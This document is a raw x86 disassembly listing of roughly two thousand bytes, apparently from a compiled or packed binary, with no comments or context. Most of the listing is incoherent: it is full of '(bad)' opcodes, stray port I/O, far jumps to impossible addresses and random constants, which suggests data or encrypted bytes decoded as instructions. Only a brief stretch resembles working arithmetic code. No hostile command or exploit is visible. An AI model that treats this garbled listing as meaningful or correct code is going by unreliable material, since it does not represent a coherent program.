  410c9e:	outs   dx,BYTE PTR ds:[esi]
  410c9f:	imul   edi,DWORD PTR [eax+0x40],0x33fd3eb2
  410ca6:	lea    edx,[eax+0x3b]
  410ca9:	(bad)  
  410caa:	cdq    
  410cab:	scas   eax,DWORD PTR es:[edi]
  410cac:	push   ebx
  410cad:	and    al,0xd0
  410caf:	in     al,0xc1
  410cb1:	test   al,0x22
  410cb3:	xchg   bh,ch
  410cb5:	mov    eax,0xd553ea5b
  410cba:	cwde   
  410cbb:	add    eax,0x60e818a6
  410cc0:	xor    eax,DWORD PTR [esi+0x24ac1a32]
  410cc6:	mov    ebp,0xfec9ed23
  410ccb:	scas   al,BYTE PTR es:[edi]
  410ccc:	les    ecx,FWORD PTR [ebp-0x6a]
  410ccf:	lahf   
  410cd0:	or     BYTE PTR [esi-0x47],dh
  410cd3:	fisttp QWORD PTR [esi+0x713f18ff]
  410cd9:	into   
  410cda:	or     BYTE PTR [eax],bh
  410cdc:	mov    dl,0xa0
  410cde:	mov    eax,ds:0x69207713
  410ce3:	mov    dh,0x46
  410ce5:	adc    DWORD PTR [edx+0x18],ebp
  410ce8:	ficom  WORD PTR [ecx-0x2af25d8]
  410cee:	add    dh,BYTE PTR [esi+0x434e5e57]
  410cf4:	rcl    BYTE PTR [ecx],1
  410cf6:	dec    ebx
  410cf7:	ret    
  410cf8:	pop    esp
  410cf9:	push   ds
  410cfa:	jmp    0x2ddd1e0a
  410cff:	sbb    BYTE PTR [ecx],ch
  410d01:	xor    esp,DWORD PTR [edi+0x524fcd88]
  410d07:	pop    ds
  410d08:	or     eax,0xfdee7775
  410d0d:	add    DWORD PTR [eax+0x2d],edi
  410d10:	mov    gs,edx
  410d12:	sbb    edi,0xcda50b15
  410d18:	inc    ecx
  410d19:	xchg   esp,eax
  410d1a:	enter  0x53c9,0x6e
  410d1e:	fild   DWORD PTR [edi+0x3f]
  410d21:	add    eax,0x27b0cbec
  410d26:	out    0x36,eax
  410d28:	push   ebx
  410d29:	cmc    
  410d2a:	mov    al,0xaa
  410d2c:	pop    ecx
  410d2d:	out    dx,eax
  410d2e:	idiv   BYTE PTR [edi+0x480b34da]
  410d34:	jnp    0x410d94
  410d36:	into   
  410d37:	shl    DWORD PTR [ebx],cl
  410d39:	cmp    al,0x4
  410d3b:	adc    esi,DWORD PTR [edi]
  410d3d:	arpl   di,sp
  410d3f:	lds    edx,FWORD PTR [ecx+0x5941c455]
  410d45:	inc    ebp
  410d46:	daa    
  410d47:	sti    
  410d48:	sbb    ch,BYTE PTR [ebx+0x1dbca071]
  410d4e:	fistp  QWORD PTR [ebx]
  410d50:	test   eax,0x4fac5474
  410d55:	clc    
  410d56:	in     al,dx
  410d57:	fnstcw WORD PTR [eax]
  410d59:	jo     0x410d06
  410d5b:	stos   DWORD PTR es:[edi],eax
  410d5c:	test   eax,0x69f26789
  410d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d63:	sahf   
  410d64:	jecxz  0x410dd8
  410d66:	cmp    edx,DWORD PTR [ebx+0x38]
  410d69:	xor    DWORD PTR [ecx],edi
  410d6b:	(bad)
  410d6f:	push   ebx
  410d70:	cdq    
  410d71:	push   edx
  410d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d73:	std    
  410d74:	aas    
  410d75:	inc    eax
  410d76:	pop    esi
  410d77:	fdiv   QWORD PTR [edx]
  410d79:	xor    ecx,DWORD PTR [edx-0x3ab2ab1c]
  410d7f:	xchg   edi,eax
  410d80:	aas    
  410d81:	xor    dh,al
  410d83:	stos   BYTE PTR es:[edi],al
  410d84:	jae    0x410d3e
  410d86:	xor    ebx,DWORD PTR [edx]
  410d88:	mov    edx,0x7e23ea28
  410d8d:	fcmovnb st,st(5)
  410d8f:	mov    ss,WORD PTR [edi+0x2e1804c1]
  410d95:	xor    al,0xcd
  410d97:	fisttp QWORD PTR [ebx]
  410d99:	mov    al,ds:0xeb11264e
  410d9e:	out    dx,al
  410d9f:	fs out dx,al
  410da1:	frndint 
  410da3:	out    0xda,eax
  410da5:	int    0xc1
  410da7:	add    dl,BYTE PTR [ebp-0xd]
  410daa:	dec    ebx
  410dab:	(bad)  
  410dac:	in     al,dx
  410dad:	ror    BYTE PTR [edx],cl
  410daf:	mov    ds:0xbcf43986,eax
  410db4:	jmp    0x8bb0ad36
  410db9:	push   es
  410dba:	xor    edx,0xc0000000
  410dc0:	mov    DWORD PTR [ebp+0x14],edx
  410dc3:	mov    edx,DWORD PTR [esi+0x4]
  410dc6:	xor    eax,0xba699573
  410dcb:	xor    ecx,edx
  410dcd:	shrd   eax,ecx,0x2
  410dd1:	or     eax,DWORD PTR [ebp+0x10]
  410dd4:	shr    ecx,0x2
  410dd7:	mov    DWORD PTR [ebp+0x8],eax
  410dda:	mov    eax,ecx
  410ddc:	or     eax,DWORD PTR [ebp+0x14]
  410ddf:	mov    ecx,DWORD PTR [ebx]
  410de1:	mov    edx,DWORD PTR [ebx+0x4]
  410de4:	push   eax
  410de5:	push   DWORD PTR [ebp+0x8]
  410de8:	push   edx
  410de9:	push   ecx
  410dea:	call   0x41df90
  410def:	mov    eax,DWORD PTR [esi]
  410df1:	mov    ecx,DWORD PTR [esi+0x4]
  410df4:	shrd   eax,ecx,0x2
  410df8:	shr    ecx,0x2
  410dfb:	shr    edx,0x1e
  410dfe:	jmp    0x411388
  410e03:	ret    0x707f
  410e06:	and    eax,0x58c21820
  410e0b:	cmp    DWORD PTR [ebx-0x70],ebp
  410e0e:	outs   dx,BYTE PTR ds:[esi]
  410e0f:	push   edx
  410e10:	jecxz  0x410dec
  410e12:	je     0x410daf
  410e14:	push   eax
  410e15:	push   ss
  410e16:	push   ss
  410e17:	cmp    eax,0x42161604
  410e1c:	test   bl,dh
  410e1e:	in     al,0xfe
  410e20:	adc    dl,BYTE PTR [edx+eiz*1]
  410e23:	push   es
  410e24:	and    BYTE PTR [ecx-0x62],ch
  410e27:	dec    ebx
  410e28:	call   0x29f37224
  410e2d:	sbb    al,0xf6
  410e2f:	jb     0x410ea9
  410e31:	sbb    dl,bh
  410e33:	shr    BYTE PTR ds:0x94086e0c,1
  410e39:	jns    0x410dc4
  410e3b:	xor    al,0x78
  410e3d:	or     eax,0x593b628d
  410e42:	xor    bh,bl
  410e44:	push   ebx
  410e45:	push   ecx
  410e46:	pop    edx
  410e47:	out    dx,eax
  410e48:	add    eax,0x99bc1b80
  410e4d:	dec    esp
  410e4e:	fstp   DWORD PTR es:[ebx]
  410e51:	jo     0x410df4
  410e53:	(bad)  
  410e54:	sti    
  410e55:	rcl    DWORD PTR [esi],1
  410e57:	xor    esp,DWORD PTR [ecx]
  410e59:	rcl    esi,1
  410e5b:	adc    eax,ecx
  410e5d:	mov    ah,bh
  410e5f:	adc    BYTE PTR [edi-0x8cc2bde],0x23
  410e66:	call   DWORD PTR [ecx]
  410e68:	xchg   ebp,eax
  410e69:	dec    edx
  410e6a:	das    
  410e6b:	mov    BYTE PTR [ebx-0x4],ch
  410e6e:	pop    eax
  410e6f:	dec    edi
  410e70:	call   0x1d61:0xdc99b4aa
  410e77:	add    al,0x87
  410e79:	lahf   
  410e7a:	add    ebp,DWORD PTR [esi+0x49ecbc84]
  410e80:	pop    esp
  410e81:	neg    DWORD PTR [edx+ecx*1-0x44a1a0ca]
  410e88:	sub    eax,0xf433659d
  410e8d:	and    eax,0x833c0524
  410e92:	mov    ebp,DWORD PTR gs:[esi-0x79626dbe]
  410e99:	dec    ebp
  410e9a:	add    eax,0x9d5c1569
  410e9f:	mov    ah,0x8c
  410ea1:	sbb    BYTE PTR [edi],ch
  410ea3:	mov    dh,0x66
  410ea5:	inc    eax
  410ea6:	jb     0x410e4f
  410ea8:	or     eax,DWORD PTR [ebx+0x65]
  410eab:	(bad)  
  410eac:	sub    ebx,DWORD PTR [edi+0x6a]
  410eaf:	dec    ebp
  410eb0:	push   0x5ba642ca
  410eb5:	pop    eax
  410eb6:	pop    ds
  410eb7:	push   edx
  410eb8:	pop    esp
  410eb9:	stc    
  410eba:	test   eax,0x642d18aa
  410ebf:	imul   DWORD PTR ds:0x812fbdcc
  410ec5:	pop    edx
  410ec6:	std    
  410ec7:	adc    BYTE PTR [eax-0x3b9f7ddf],cl
  410ecd:	sbb    ebp,DWORD PTR [esi+eax*1-0x13]
  410ed1:	push   esp
  410ed2:	bound  ebx,QWORD PTR [edx]
  410ed4:	(bad)  
  410ed5:	jo     0x410e59
  410ed7:	inc    eax
  410ed8:	jae    0x410e67
  410eda:	xor    al,BYTE PTR [esi]
  410edc:	(bad)  
  410edd:	ins    DWORD PTR es:[edi],dx
  410ede:	dec    eax
  410edf:	jp     0x410eb1
  410ee1:	xchg   edx,eax
  410ee2:	loop   0x410ee7
  410ee4:	lock fdivp st(2),st
  410ee7:	push   eax
  410ee8:	and    DWORD PTR [edx],0xf141a42
  410eee:	push   ss
  410eef:	cmc    
  410ef0:	jnp    0x410f27
  410ef2:	pop    ebp
  410ef3:	inc    ebx
  410ef4:	stc    
  410ef5:	daa    
  410ef6:	xchg   BYTE PTR [edx-0x2d4a808],dh
  410efc:	mov    esp,0x33be0596
  410f01:	mov    ecx,0x4f0a76b3
  410f06:	ins    BYTE PTR es:[edi],dx
  410f07:	push   eax
  410f08:	pop    ecx
  410f09:	jge    0x410eba
  410f0b:	dec    esi
  410f0c:	out    dx,al
  410f0d:	aaa    
  410f0e:	inc    ecx
  410f0f:	dec    ebp
  410f10:	pop    esi
  410f11:	rol    bh,cl
  410f13:	(bad)  
  410f14:	jmp    0xa043:0x378b43de
  410f1b:	xlat   BYTE PTR ds:[ebx]
  410f1c:	xchg   ebp,eax
  410f1d:	lds    esp,FWORD PTR [edi-0x17]
  410f20:	call   0x50691364
  410f25:	repz push ebx
  410f27:	cld    
  410f28:	cwde   
  410f29:	pop    ebx
  410f2a:	mov    ecx,0x22cda9e5
  410f2f:	inc    edx
  410f30:	je     0x410f5b
  410f32:	ss (bad) 
  410f34:	fidiv  DWORD PTR [edx-0x6c]
  410f37:	push   ebp
  410f38:	pop    ebp
  410f39:	ret    
  410f3a:	and    BYTE PTR [esi],0x2e
  410f3d:	(bad)  
  410f3e:	and    cl,BYTE PTR [ecx-0x72588766]
  410f44:	dec    ebp
  410f45:	ret    0x2bff
  410f48:	(bad)  
  410f49:	lahf   
  410f4a:	dec    ebp
  410f4b:	loope  0x410f08
  410f4d:	push   ds
  410f4e:	shr    DWORD PTR [edx],cl
  410f50:	xor    eax,0xe50826ca
  410f55:	and    ecx,DWORD PTR [edi+edi*1-0x4508d8be]
  410f5c:	mov    dh,0xb5
  410f5e:	repz xor ch,BYTE PTR [eax+0x0]
  410f62:	pop    ebp
  410f63:	sbb    bl,BYTE PTR [edi+esi*8+0x4d544c42]
  410f6a:	push   0x374f4542
  410f6f:	inc    edi
  410f70:	(bad)  
  410f72:	stc    
  410f73:	out    dx,eax
  410f74:	cli    
  410f75:	dec    esi
  410f76:	xchg   edi,eax
  410f77:	lods   al,BYTE PTR ds:[esi]
  410f78:	retf   
  410f79:	inc    ecx
  410f7a:	push   es
  410f7b:	pop    ds
  410f7c:	pop    eax
  410f7d:	xrelease xchg BYTE PTR [ecx-0x4e9c5951],cl
  410f84:	push   es
  410f85:	mov    esi,DWORD PTR [ebp-0x55f50e1]
  410f8b:	xchg   esp,eax
  410f8c:	mov    bh,0x96
  410f8f:	int3   
  410f90:	cmp    DWORD PTR [ebp-0x41],0xffffffc9
  410f94:	test   eax,0xc7350b30
  410f99:	mov    cl,0x45
  410f9b:	test   BYTE PTR [ebx],ah
  410f9d:	mov    esp,ss
  410f9f:	mov    edx,DWORD PTR [ebx+edx*2]
  410fa2:	lahf   
  410fa3:	push   ds
  410fa4:	pushf  
  410fa5:	mov    si,0xadc4
  410fa9:	lods   al,BYTE PTR ds:[esi]
  410faa:	les    eax,FWORD PTR [ecx+0x61340e11]
  410fb0:	inc    ecx
  410fb1:	jg     0x411000
  410fb3:	(bad)  
  410fb4:	ror    ah,1
  410fb6:	inc    ecx
  410fb7:	dec    esi
  410fb8:	div    BYTE PTR [esi+0x55186e1f]
  410fbe:	loopne 0x410fcb
  410fc0:	stos   DWORD PTR es:[edi],eax
  410fc1:	pop    ebx
  410fc2:	sbb    ch,BYTE PTR [edi]
  410fc4:	push   ecx
  410fc5:	push   es
  410fc6:	popf   
  410fc7:	push   cs
  410fc8:	xor    eax,0x4e35ce58
  410fcd:	ja     0x410f50
  410fcf:	jno    0x410f75
  410fd1:	pop    es
  410fd2:	hlt    
  410fd3:	jno    0x410f93
  410fd5:	push   0xe3b44bcf
  410fda:	xchg   ebx,eax
  410fdb:	imul   edx,DWORD PTR [esi+ebx*1+0xa],0xe5b698a2
  410fe3:	nop
  410fe4:	add    eax,0x5c20ae3d
  410fe9:	mov    al,ds:0x69707e40
  410fee:	int3   
  410fef:	cmp    DWORD PTR [eax-0x52],esi
  410ff2:	and    dl,BYTE PTR [ebx+0x61]
  410ff5:	imul   edi,DWORD PTR [edx+0x71],0x72e92b99
  410ffc:	mov    eax,0x942856aa
  411001:	inc    di
  411003:	stos   BYTE PTR es:[edi],al
  411004:	jns    0x411039
  411006:	sbb    BYTE PTR [edx-0xef17b74],0xbc
  41100d:	(bad)  
  41100e:	neg    DWORD PTR [eax-0x35]
  411011:	scas   eax,DWORD PTR es:[edi]
  411012:	fstp   QWORD PTR [edi]
  411014:	mov    BYTE PTR [edx],bl
  411016:	cmp    al,dh
  411018:	xchg   ebx,eax
  411019:	pop    ds
  41101a:	aas    
  41101b:	pop    ecx
  41101c:	dec    ecx
  41101d:	cmp    al,0x51
  41101f:	ret    0x5893
  411022:	pop    esi
  411023:	sbb    BYTE PTR [eax+0x10a95bdf],0xc0
  41102a:	jecxz  0x410fff
  41102c:	push   0x94097dd0
  411031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411032:	adc    ebx,DWORD PTR [ecx]
  411034:	in     eax,0x45
  411036:	aam    0xb5
  411038:	stos   DWORD PTR es:[edi],eax
  411039:	dec    edx
  41103a:	or     edi,DWORD PTR [ebx-0x79]
  41103d:	scas   eax,DWORD PTR es:[edi]
  41103e:	test   eax,0xc9fb6213
  411043:	jmp    0x4110ad
  411045:	aas    
  411046:	adc    DWORD PTR [ebp+0x1b277f97],esi
  41104c:	or     dh,BYTE PTR [ecx]
  41104e:	test   bl,bh
  411050:	shl    DWORD PTR [edx+0x497ad5da],cl
  411056:	add    ebx,DWORD PTR ds:0x170e9434
  41105c:	push   ecx
  41105d:	ins    BYTE PTR es:[edi],dx
  41105e:	xchg   ebx,eax
  41105f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411060:	or     eax,ebx
  411062:	fwait
  411063:	push   ss
  411064:	rcr    DWORD PTR [ecx-0x15],1
  411067:	mov    eax,ds:0xd8a191d5
  41106c:	dec    ebp
  41106d:	xor    eax,0x6500b3af
  411072:	(bad)  
  411073:	mov    cl,0xfc
  411075:	sbb    ebx,DWORD PTR [edi]
  411077:	pop    ss
  411078:	xchg   BYTE PTR [edx-0x997163e],cl
  41107e:	int3   
  41107f:	push   ds
  411080:	xor    DWORD PTR [esi+0x4e],eax
  411083:	adc    esi,DWORD PTR [edx]
  411085:	push   esi
  411086:	xor    eax,0x4778009
  41108b:	xchg   ecx,eax
  41108c:	dec    esi
  41108d:	cdq    
  41108e:	bound  edx,QWORD PTR fs:[edx-0x1761e724]
  411095:	lahf   
  411096:	lea    esp,[ebp-0x63]
  411099:	or     bl,BYTE PTR [ecx+0x67]
  41109c:	ret    
  41109d:	dec    ebx
  41109e:	in     al,dx
  41109f:	ret    
  4110a0:	xor    edx,DWORD PTR [ecx]
  4110a2:	and    eax,0xc7756df6
  4110a7:	iret   
  4110a8:	xchg   ebp,eax
  4110a9:	js     0x41103b
  4110ab:	mov    ebp,0xf8b2743f
  4110b0:	aas    
  4110b1:	jbe    0x4110e1
  4110b3:	daa    
  4110b4:	sar    BYTE PTR ds:0xb08082e2,cl
  4110ba:	jmp    0x41107c
  4110bc:	data16 je 0x4110be
  4110bf:	or     esi,DWORD PTR gs:[esi+0x6c]
  4110c3:	pop    esp
  4110c4:	lds    esp,FWORD PTR [eax-0x3dd60a07]
  4110ca:	cmc    
  4110cb:	xor    BYTE PTR [edi+0x56],ch
  4110ce:	push   ebp
  4110cf:	or     BYTE PTR [esi-0x4f6551cb],dl
  4110d5:	add    ch,BYTE PTR [edi-0x6c]
  4110d8:	sub    bh,dh
  4110da:	inc    esi
  4110db:	test   DWORD PTR [esi+0x338e5c5e],edi
  4110e1:	pop    DWORD PTR [ebx-0x79]
  4110e4:	pop    ecx
  4110e5:	std    
  4110e6:	test   DWORD PTR [ebp-0x672da200],0x99602b68
  4110f0:	add    eax,0x6cb91d81
  4110f5:	and    al,BYTE PTR [esi+0x6b]
  4110f8:	jg     0x411147
  4110fa:	dec    ebp
  4110fb:	outs   dx,BYTE PTR ds:[esi]
  4110fc:	xchg   ebx,eax
  4110fd:	in     al,0x47
  4110ff:	xor    eax,DWORD PTR [esi-0x80daac8]
  411105:	mov    esi,0x692bbd9d
  41110a:	and    al,0x9d
  41110c:	push   ecx
  41110d:	adc    al,0xd
  41110f:	mov    esi,0xc148edfd
  411114:	dec    ecx
  411115:	pop    esp
  411116:	sub    BYTE PTR [ebp-0x1319c5f],0x11
  41111d:	aaa    
  41111e:	push   ss
  41111f:	or     al,0x41
  411121:	sub    ch,ah
  411123:	xchg   ebp,eax
  411124:	xor    eax,0xd100e407
  411129:	and    edx,DWORD PTR [edx+0x7d3fd9ca]
  41112f:	adc    BYTE PTR [ebp-0xd5a082],ah
  411135:	cmp    DWORD PTR [ebp+esi*8+0x3a],esi
  411139:	ja     0x41110e
  41113b:	fs enter 0x329f,0x31
  411140:	push   ebp
  411141:	or     ebp,DWORD PTR [edx-0x35811762]
  411147:	mov    ds:0xf71ed0b5,al
  41114c:	div    ah
  41114e:	adc    BYTE PTR [ebx+0x3e],cl
  411151:	ins    DWORD PTR es:[edi],dx
  411152:	push   ss
  411153:	nop
  411154:	xchg   esi,eax
  411155:	and    eax,edx
  411157:	or     al,0x3f
  411159:	loope  0x411142
  41115b:	sub    ah,BYTE PTR [edx+eiz*4]
  41115e:	shl    BYTE PTR [edx-0x2a3c3d07],0xdb
  411165:	push   ecx
  411166:	test   BYTE PTR [ebx],ch
  411168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411169:	fst    QWORD PTR [ebx+edx*2+0x9b6ca37]
  411170:	sbb    al,0x72
  411172:	push   DWORD PTR [edx]
  411174:	into   
  411175:	push   cs
  411176:	or     edi,ecx
  411178:	or     BYTE PTR [esp+ebx*1],ah
  41117b:	mov    eax,ds:0x19419216
  411180:	adc    al,0xdc
  411182:	pusha  
  411183:	push   ebp
  411184:	lods   eax,DWORD PTR ds:[esi]
  411185:	fmul   QWORD PTR [eax-0xe]
  411188:	pop    es
  411189:	(bad)  
  41118a:	daa    
  41118b:	psubd  mm0,mm0
  41118e:	mov    cl,0x3d
  411190:	lock das 
  411192:	pop    esi
  411193:	sbb    DWORD PTR [edx],edi
  411195:	lods   al,BYTE PTR ds:[esi]
  411196:	test   al,0xa
  411198:	test   eax,eax
  41119a:	or     BYTE PTR [edx],dl
  41119c:	cmc    
  41119d:	jno    0x4111d1
  41119f:	jnp    0x41114c
  4111a1:	jb     0x411131
  4111a3:	jne    0x411184
  4111a5:	stos   DWORD PTR es:[edi],eax
  4111a6:	mov    edi,0x1c82511f
  4111ab:	out    0x3a,al
  4111ad:	add    DWORD PTR [edi],edx
  4111af:	in     al,dx
  4111b0:	gs mov ch,0xfb
  4111b3:	cmc    
  4111b4:	cld    
  4111b5:	popa   
  4111b6:	outs   dx,DWORD PTR ds:[esi]
  4111b7:	(bad)  
  4111b8:	sahf   
  4111b9:	sahf   
  4111ba:	lahf   
  4111bb:	add    al,0x10
  4111bd:	jno    0x4111d1
  4111bf:	fimul  WORD PTR [edi+0x35f4ec72]
  4111c5:	gs xchg ebx,eax
  4111c7:	fcom   QWORD PTR [ebp-0x7bef89b7]
  4111cd:	mov    ecx,0x4638836a
  4111d2:	pop    ss
  4111d3:	inc    edi
  4111d4:	(bad)  [eax]
  4111d6:	cmp    esp,0x27
  4111d9:	fs pop esp
  4111db:	push   0xffffffd0
  4111dd:	iret   
  4111de:	fcmovnb st,st(3)
  4111e0:	or     ebx,DWORD PTR [ebp-0x3]
  4111e3:	icebp  
  4111e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111e5:	sbb    al,0x2e
  4111e7:	ss popa 
  4111e9:	fsubr  QWORD PTR ds:0xbb9d2c8b
  4111ef:	push   0x6b9db426
  4111f4:	pusha  
  4111f5:	and    edi,0xa3ab434
  4111fb:	mov    edx,0x2de11ee4
  411200:	push   edx
  411201:	inc    eax
  411202:	mov    eax,ds:0x6d5664cd
  411207:	cli    
  411208:	leave  
  411209:	dec    eax
  41120a:	pusha  
  41120b:	sbb    DWORD PTR [esi],eax
  41120d:	outs   dx,DWORD PTR ds:[esi]
  41120e:	push   ebp
  41120f:	pusha  
  411210:	test   eax,0x868beb92
  411215:	mov    edx,esp
  411217:	aam    0xf9
  411219:	xchg   ebx,eax
  41121a:	sahf   
  41121b:	push   ds
  41121c:	push   ds
  41121d:	mov    bl,0x95
  41121f:	mov    WORD PTR [edi-0x49],?
  411222:	pushf  
  411223:	mov    ds:0xe1addbbd,al
  411228:	and    ecx,ebx
  41122a:	test   DWORD PTR [ebx],esp
  41122c:	pop    es
  41122d:	push   edx
  41122e:	(bad)  
  41122f:	sub    eax,0x4c4b281f
  411234:	push   ss
  411235:	sub    BYTE PTR [ebp*1+0x715c5acd],bl
  41123c:	lock daa 
  41123e:	sbb    DWORD PTR [eax],esi
  411240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411241:	mov    eax,ds:0x4f6dd770
  411246:	test   eax,0xd290a7d0
  41124b:	ss add al,0x9d
  41124e:	gs je  0x411234
  411251:	sub    dh,BYTE PTR [ebp-0x72]
  411254:	mov    ecx,0x6a1bab4e
  411259:	rcl    BYTE PTR ds:0xf63f6127,1
  41125f:	retf   
  411260:	cld    
  411261:	stc    
  411262:	jle    0x41123c
  411264:	loope  0x4112da
  411266:	int    0x21
  411268:	imul   ebx,ebx,0x85961969
  41126e:	sbb    eax,0xa4502ba6
  411273:	sub    ebp,eax
  411275:	lods   eax,DWORD PTR ds:[esi]
  411276:	(bad)  
  411277:	push   cs
  411278:	fnsave [eax-0x7c]
  41127b:	mov    bh,0x7f
  41127d:	shr    bh,1
  41127f:	mov    edx,0x7dca91
  411284:	ret    0xc5e7
  411287:	test   DWORD PTR [eax-0x45],ecx
  41128a:	bound  ebp,QWORD PTR [esp+eax*4-0x6d]
  41128e:	fisub  DWORD PTR [ebx+0x65]
  411291:	mov    ecx,0x1da1772e
  411296:	(bad)  
  411297:	lahf   
  411298:	mov    edi,0x1a959fe4
  41129d:	imul   ecx,DWORD PTR [edx-0x5f],0xffffffac
  4112a1:	js     0x411254
  4112a3:	int3   
  4112a4:	stc    
  4112a5:	mov    esi,0xa97539b6
  4112aa:	std    
  4112ab:	mov    bl,0x16
  4112ad:	cld    
  4112ae:	push   esi
  4112af:	into   
  4112b0:	adc    edx,DWORD PTR [eax+0x2d]
  4112b3:	clc    
  4112b4:	cmp    BYTE PTR [edx-0x1856454d],0x16
  4112bb:	jns    0x411327
  4112bd:	inc    ecx
  4112be:	pusha  
  4112bf:	ret    0x47b1
  4112c2:	push   esp
  4112c3:	les    edx,FWORD PTR [edx+0x6e8d9412]
  4112c9:	arpl   WORD PTR [esp+esi*8],bx
  4112cc:	test   eax,0x21084516
  4112d1:	test   BYTE PTR [eax+0x45c59fab],dh
  4112d7:	pop    esp
  4112d8:	scas   al,BYTE PTR es:[edi]
  4112d9:	xor    al,ch
  4112db:	add    BYTE PTR [edx-0x42],0x1b
  4112df:	jmp    0x4112d4
  4112e1:	jle    0x411283
  4112e3:	inc    esp
  4112e4:	adc    DWORD PTR [ecx-0x5129538b],edi
  4112ea:	add    ah,BYTE PTR [ebx+ebp*8-0x7f]
  4112ee:	sbb    eax,0xa928c17c
  4112f3:	xor    dl,BYTE PTR [ebp+0x6e]
  4112f6:	mov    ecx,0xb93fceff
  4112fb:	xor    BYTE PTR [esi+0x198cadd6],0xac
  411302:	sub    DWORD PTR [esi+0x2c],eax
  411305:	pushf  
  411306:	adc    DWORD PTR [esi+0x7b753ff3],ecx
  41130c:	lahf   
  41130d:	retf   
  41130e:	stos   BYTE PTR es:[edi],al
  41130f:	rcl    DWORD PTR [edx],cl
  411311:	push   cs
  411312:	iret   
  411313:	push   cs
  411314:	xor    eax,esi
  411316:	push   esi
  411317:	ret    
  411318:	dec    ebp
  411319:	pop    ss
  41131a:	push   es
  41131b:	int3   
  41131c:	and    ch,al
  41131e:	xchg   ebx,edi
  411320:	test   DWORD PTR [eax],ecx
  411322:	xchg   ecx,eax
  411323:	inc    ebx
  411324:	in     eax,dx
  411325:	ret    0xb47f
  411328:	sub    eax,DWORD PTR [ecx]
  41132a:	imul   ebx,DWORD PTR [eax-0x4],0xfc488b93
  411331:	repnz mov esp,DWORD PTR [esi]
  411334:	sub    bh,0x3c
  411337:	mov    bl,0x92
  411339:	mov    bl,0x6a
  41133b:	sbb    eax,0x9d151687
  411340:	pop    ebp
  411341:	mov    ah,0xae
  411343:	mov    esp,0x327ff453
  411348:	push   edx
  411349:	add    DWORD PTR [ecx+0x3a],0x8e364e91
  411350:	(bad)  
  411351:	repz adc ebx,DWORD PTR [eax+eax*8]
  411355:	add    eax,0xa402f4a0
  41135a:	retf   
  41135b:	test   BYTE PTR [edx],al
  41135d:	bound  esi,QWORD PTR [edi-0x1f]
  411360:	imul   edi,ecx,0xffffffe8
  411363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411364:	aaa    
  411365:	in     eax,dx
  411366:	js     0x411349
  411368:	jb     0x4113e8
  41136a:	push   eax
  41136b:	leave  
  41136c:	mov    dh,0x4d
  41136e:	pop    es
  41136f:	cs or  bl,cl
  411372:	xlat   BYTE PTR ds:[ebx]
  411373:	fistp  WORD PTR [eax-0x12]
  411376:	push   ss
  411377:	fcom   DWORD PTR [ebx+ecx*4+0x20]
  41137b:	mov    al,0x2e
  41137d:	jae    0x411397
  41137f:	lock sbb esp,0x1f99f276
  411386:	or     DWORD PTR [eax],edi
  411388:	xor    ecx,0xe702a276
  41138e:	push   ecx
  41138f:	xor    eax,edi
  411391:	mov    DWORD PTR [ebp+0x10],edx
  411394:	jmp    0x41191e
  411399:	jl     0x4113d8
  41139b:	mov    ds:0x1459a28b,eax
  4113a0:	inc    eax
  4113a1:	jmp    DWORD PTR [eax-0x5bef4bc0]
  4113a7:	out    dx,eax
  4113a8:	push   0x161646d0
  4113ad:	cmp    eax,0xeb161604
  4113b2:	jnp    0x411362
  4113b4:	adc    al,0x9
  4113b6:	aaa    
  4113b7:	shr    BYTE PTR [ecx+0x2b3a175b],1
  4113bd:	test   BYTE PTR [ecx+edx*4],0x24
  4113c1:	imul   ecx,DWORD PTR [edx],0x24
  4113c4:	or     eax,0x4f0cfd71
  4113c9:	mov    ?,WORD PTR [edx+0xe6f1f1]
  4113cf:	mov    eax,ss:0xedaa97b
  4113d5:	cdq    
  4113d6:	mov    al,0xea
  4113d8:	mov    esi,0x2bee8323
  4113dd:	stos   DWORD PTR es:[edi],eax
  4113de:	xchg   edi,eax
  4113df:	retf   0xd6eb
  4113e2:	loopne 0x41142d
  4113e4:	xor    BYTE PTR [edi+0x62],bl
  4113e7:	jp     0x41138a
  4113e9:	fist   WORD PTR [eax]
  4113eb:	mov    al,0x95
  4113ed:	outs   dx,DWORD PTR ds:[esi]
  4113ee:	mov    al,ds:0x6759712c
  4113f3:	sbb    eax,0xd896e4ca
  4113f8:	jmp    0xbee7:0xa4e7f07e
  4113ff:	mov    al,0xf7
  411401:	jne    0x4113ff
  411403:	test   al,0x4f
  411405:	dec    ebp
  411406:	pop    edi
  411407:	mov    bl,0xee
  411409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41140a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41140b:	mov    cs,WORD PTR ds:0xe93aff3
  411411:	jb     0x41148e
  411413:	fsubp  st(7),st
  411415:	dec    edx
  411416:	fwait
  411417:	ss sti 
  411419:	jo     0x4113ff
  41141b:	stos   BYTE PTR es:[edi],al
  41141c:	outs   dx,DWORD PTR ds:[esi]
  41141d:	sbb    cl,BYTE PTR [eax]
  41141f:	and    ah,ch
  411421:	stos   BYTE PTR es:[edi],al
  411422:	mov    bh,0xb2
  411424:	sahf   
  411425:	jno    0x4113be
  411427:	mov    ebp,0x4f75d33a
  41142c:	shl    BYTE PTR [ebx+0x33],0xa1
  411430:	scas   eax,DWORD PTR es:[edi]
  411431:	xlat   BYTE PTR ds:[ebx]
  411432:	xor    DWORD PTR [edi-0x68aba944],0x72
  411439:	add    al,0x85
  41143b:	inc    edi
  41143c:	and    DWORD PTR [edi-0x1f],eax
  41143f:	xchg   ebp,eax
  411440:	fmul   st(6),st
  411442:	ss (bad) 
  411444:	mov    eax,ds:0x53bbd833
  411449:	cmp    BYTE PTR [ebx-0x6f],0x25
  41144d:	or     al,0xa3
  41144f:	leave  
  411450:	jp     0x4114b8
  411452:	pop    ds
  411453:	jp     0x4114d3
  411455:	add    dh,BYTE PTR [eax-0x1d]
  411458:	popf   
  411459:	out    dx,eax
  41145a:	push   esi
  41145b:	cmc    
  41145c:	cmc    
  41145d:	jbe    0x4114b1
  41145f:	jge    0x4114d9
